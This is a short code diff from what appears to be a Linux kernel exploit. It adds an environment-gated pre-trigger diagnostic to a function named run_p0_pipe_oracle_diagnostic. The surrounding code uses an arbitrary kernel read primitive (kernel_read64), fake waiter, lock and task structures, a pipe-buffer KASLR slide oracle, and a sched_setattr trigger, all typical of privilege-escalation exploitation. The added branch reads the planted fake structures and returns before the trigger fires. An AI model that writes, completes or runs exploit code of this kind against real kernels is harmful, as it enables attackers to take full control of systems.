@@ -869,6 +869,26 @@ int run_p0_pipe_oracle_diagnostic(int fd) {
           "target=%016zx original=%016llx\n",
           pipebuf_page_base, fops_page_base, slide_oracle_parent,
           slide_oracle_target, (unsigned long long)original_target);
+  
+    if (getenv("P0_ORACLE_PRETRIGGER_DIAG")) {
+    uint64_t waiter_task =
+        kernel_read64(fd, fake_w0 + FAKE_WAITER_TASK_OFF);
+    uint64_t waiter_lock =
+        kernel_read64(fd, fake_w0 + FAKE_WAITER_LOCK_OFF);
+
+    pr_info("p0 pretrigger fake_waiter=%016zx task_field=%016llx "
+            "lock_field=%016llx expected_lock=%016zx fake_task=%016zx\n",
+            fake_w0,
+            (unsigned long long)waiter_task,
+            (unsigned long long)waiter_lock,
+            fake_lock,
+            fake_task);
+
+    if (waiter_lock != fake_lock) {
+      pr_error("p0 pretrigger waiter lock mismatch; refusing trigger\n");
+    }
+    return 0;  // intentional: do not call sched_setattr
+  }
   dump_p0_oracle_words(fd, "target-before", target_start, 20);
   dump_p0_oracle_words(fd, "parent-before", parent_start, 8);
   if (!slide_trigger_physical_state()) {
